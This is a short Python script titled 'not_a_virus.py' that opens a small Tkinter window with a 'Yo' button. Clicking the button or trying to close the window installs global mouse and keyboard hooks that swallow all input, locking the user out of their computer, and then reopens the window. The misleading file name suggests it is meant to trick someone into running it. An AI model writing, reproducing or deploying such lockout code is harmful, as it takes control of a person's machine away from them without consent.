# run py -3.7 not_a_virus.py
import os
import tkinter as t
import pyHook


def uMad(event):
    return False

def on_closins():
    # bloque la souris et le clavier
    hm = pyHook.HookManager()
    hm.MouseAll = uMad
    hm.KeyAll = uMad
    hm.HookMouse()
    hm.HookKeyboard()

    main()

def main():
    root = t.Tk()
    yo = t.Button(root, text="Yo", justify="center", command=lambda: on_closins())
    yo.pack()
    root.protocol("WM_DELETE_WINDOW", on_closins)
    root.mainloop()

if __name__ == "__main__":
    main()
